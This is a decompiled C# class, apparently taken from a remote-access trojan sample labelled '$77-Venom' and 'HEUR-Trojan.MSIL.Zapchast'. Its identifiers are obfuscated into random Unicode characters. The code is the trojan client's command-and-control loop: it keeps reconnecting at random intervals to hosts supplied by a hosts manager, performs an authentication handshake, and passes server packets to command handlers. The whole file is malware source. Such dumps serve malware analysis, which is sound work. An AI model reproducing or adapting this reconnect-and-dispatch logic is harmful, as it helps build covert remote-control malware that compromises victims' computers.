// Decompiled with JetBrains decompiler
// Type: 녀㵅⇁牥覴彀ﲒ�ᰯ쏘搃賢㋷銅樛
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.NetSerializer;
using xClient.Core.Packets.ServerPackets;

public class \uE606녀㵅\u21C1牥覴彀ﲒ\uFFFDᰯ쏘\uF7E6搃賢\u32F7銅\uE976\uF4FD\uEC0C樛 : 
  㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦
{
  private readonly 捔᷆ཆꫫ嶏\uF040ළ咙솼䋧ꖜ芻䆰藻\uFFFD\u25F4煭槍狫혱 \uE899쇉ꕺ\uECC5暕䡘ꍺ辥ꃸᅟ敇栫䏊鷬ｵ왣檓\u2A4Eꌯ炦;

  public static bool Exiting { get; private set; }

  public bool Authenticated { get; private set; }

  public \uE606녀㵅\u21C1牥覴彀ﲒ\uFFFDᰯ쏘\uF7E6搃賢\u32F7銅\uE976\uF4FD\uEC0C樛(
    捔᷆ཆꫫ嶏\uF040ළ咙솼䋧ꖜ芻䆰藻\uFFFD\u25F4煭槍狫혱 hostsManager)
  {
    this.\uE899쇉ꕺ\uECC5暕䡘ꍺ辥ꃸᅟ敇栫䏊鷬ｵ왣檓\u2A4Eꌯ炦 = hostsManager;
    this.Serializer = new Serializer((IEnumerable<System.Type>) 挞慨ጼ\uF49Dꚦꛗ堼蹋莀\u2A98\uFFFD谭\uE1E3\u2FD7焘ꖿ憵瞕䞋쟂.\uE0C5\u2AA6쁆䴑䚲駥뙒᷵갻\uE59A䈶泳ᚋꤗⲜ毭圭渼硗ם());
    this.慕躈鯇\uF302\u2E00褎䖹脻䰓먁ꖊ诶ဥ懫\uFFFD凔擽誯֟ꤰ += new 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.坊緸ᔢꌙ६ﲳ㲪疡軀앓쯴賮塙텆ᩜ\uE00D셚羞鮔륌(this.岯璣纺\uE923\uF7D3\u2ACC伹嵼\u2740ኦ㸽ᝫቲ㦂\uF8BC\u2EA0ꘚ봺簈펦);
    this.斁幤྄\u2BB6\uE4BFꘐ\uE7A0\u2EC8ᵎ㓼\u00B9뽼\uF431\u19EF\uE97E樿氙㾍죌\uFFFD += new 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.\u1DF1駲\uF0AE᳦\uF2AF胿\u23F3뺂妞䣜诲ಆ\uF47Dૢ읹䞮돍ᩎ㡦삧(this.\uE766珻꺥㱢謃빥\uE31Eʴ뚖훂\uE755塽堆\uE044岵钺䘬뾎죘쉊);
    this.荪㒻Ⲗ䱶ӪⰓ鎑挏儋\uEFFC䋭ꧯꓡ뻕\uE4D6Ӫ瀠ⱀ럡\u4DCB += new 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦.즣噟엕\u2385ꐩ쐦\u243F䭁餒\u087E㹑ధꄨ놛苕묐읛\uFFFDພ獮(this.臑熖볉\uEA8E\u1C96ꒆ㿅ꋪ虼ṃ뀤倯绸綔䋴孼窈ꢤ赱ᘀ);
  }

  public void 奘뚨\u3304瑢퉵갊䥨\u2464嵠秜踪\uF10D웯봏吂纝쥹\uFFFD䯜\uFFFD()
  {
    while (!\uE606녀㵅\u21C1牥覴彀ﲒ\uFFFDᰯ쏘\uF7E6搃賢\u32F7銅\uE976\uF4FD\uEC0C樛.Exiting)
    {
      if (!this.Connected)
      {
        Thread.Sleep(100 + new Random().Next(0, 250));
        톡홒ח\u1717\uE49F愚鳂\u2023旍結䙣\u02E8\uE483췞蠇棦槓㫺퐪琱 톡홒ח愚鳂旍結䙣췞蠇棦槓㫺퐪琱 = this.\uE899쇉ꕺ\uECC5暕䡘ꍺ辥ꃸᅟ敇栫䏊鷬ｵ왣檓\u2A4Eꌯ炦.ペ츥ၻ\uFFFD磒㦦\uF48C\uF2AFᰖ탄\u1C8BⲘ틘㨿梕\u251F읃푃㽇햦();
        this.\u09FC賂ᴈ튆ﳇꫛ\u0EC5㜷\u0CFD캱쏎ᄢ戞榛榵ᗑ䉗熰\u4DCE\uFFFD(톡홒ח愚鳂旍結䙣췞蠇棦槓㫺퐪琱.IpAddress, 톡홒ח愚鳂旍結䙣췞蠇棦槓㫺퐪琱.Port);
        Thread.Sleep(200);
        Application.DoEvents();
      }
      while (this.Connected)
      {
        Application.DoEvents();
        Thread.Sleep(2500);
      }
      if (\uE606녀㵅\u21C1牥覴彀ﲒ\uFFFDᰯ쏘\uF7E6搃賢\u32F7銅\uE976\uF4FD\uEC0C樛.Exiting)
      {
        this.\u0607碧\uFFFDꓞ䣉թ쟟蜳쁎䜗쿿뀭僷傈䠁\u21FFⷛ钝⃗䒴();
        break;
      }
      Thread.Sleep(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.ᱎ\u276E활怡賡ᵽ坅烰䡐膤敭窹\uABEB쌀欮i\u00B6봭莵돪 + new Random().Next(250, 750));
    }
  }

  private void \uE766珻꺥㱢謃빥\uE31Eʴ뚖훂\uE755塽堆\uE044岵钺䘬뾎죘쉊(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client,
    쾭匟卥쌆\uFFFD읂蘾\u3222Ｌ耈\u2D73ウ\uE00C늣飻皨ߖ빕衆뤽 packet)
  {
    System.Type type = packet.GetType();
    if (!this.Authenticated)
    {
      if (type == typeof (GetAuthentication))
      {
        \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.듗ᖧ룚葧朙㞟梵킘\uEB9F릖븫\uFFFD\u21FA니А报\u248C鲛쳀\uF5BB((GetAuthentication) packet, client);
      }
      else
      {
        if (!(type == typeof (SetAuthenticationSuccess)))
          return;
        this.Authenticated = true;
      }
    }
    else
      \u291A鶪㡄敍杫\u0F0C\uFFDD\uEA23쿊̉옡\u243E臎Ꮐ႙燯\uE785Ϟ\u2A9A잭.欍㱙踮ᮔʹ柈\u28B3䋚㘚ꆖ凐䟀뚽\uE1F3厢갏\uF111조餈舌(client, packet);
  }

  private void 臑熖볉\uEA8E\u1C96ꒆ㿅ꋪ虼ṃ뀤倯绸綔䋴孼窈ꢤ赱ᘀ(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client,
    Exception ex)
  {
    client.\u0607碧\uFFFDꓞ䣉թ쟟蜳쁎䜗쿿뀭僷傈䠁\u21FFⷛ钝⃗䒴();
  }

  private void 岯璣纺\uE923\uF7D3\u2ACC伹嵼\u2740ኦ㸽ᝫቲ㦂\uF8BC\u2EA0ꘚ봺簈펦(
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client,
    bool connected)
  {
    this.Authenticated = false;
    if (connected || \uE606녀㵅\u21C1牥覴彀ﲒ\uFFFDᰯ쏘\uF7E6搃賢\u32F7銅\uE976\uF4FD\uEC0C樛.Exiting)
      return;
    this.ﯧ觀ퟯ蛿쓯磭ᭁ禜公ꔾꗯ\uE627\uF86C\uEB12Ǎꛘ냼ॗ撏쥀();
  }

  private void ﯧ觀ퟯ蛿쓯磭ᭁ禜公ꔾꗯ\uE627\uF86C\uEB12Ǎꛘ냼ॗ撏쥀() => \uF7C8\uE5C9\uE7C0罷Ⅰ㜠䯿꧹\uE4B6湸\uE293啈ᘪᖂौ\u2297ꞓ㒏㗩\u26E4.숒\uFFFD\u1CCF缅챒ꝋﴣ\uF6FA䧞\uFFFD셥\uF58Fⷢ㾔\uEDC9馲硁㓳왩\u28C0();

  public void \u3235貳筄쐆﹍㢗쭦ὂ퐫ᙥ쒐颢䣴ӄ떲\uE6D1\u3398\uEB28\uE9AD딂()
  {
    \uE606녀㵅\u21C1牥覴彀ﲒ\uFFFDᰯ쏘\uF7E6搃賢\u32F7銅\uE976\uF4FD\uEC0C樛.Exiting = true;
    this.\u0607碧\uFFFDꓞ䣉թ쟟蜳쁎䜗쿿뀭僷傈䠁\u21FFⷛ钝⃗䒴();
  }
}
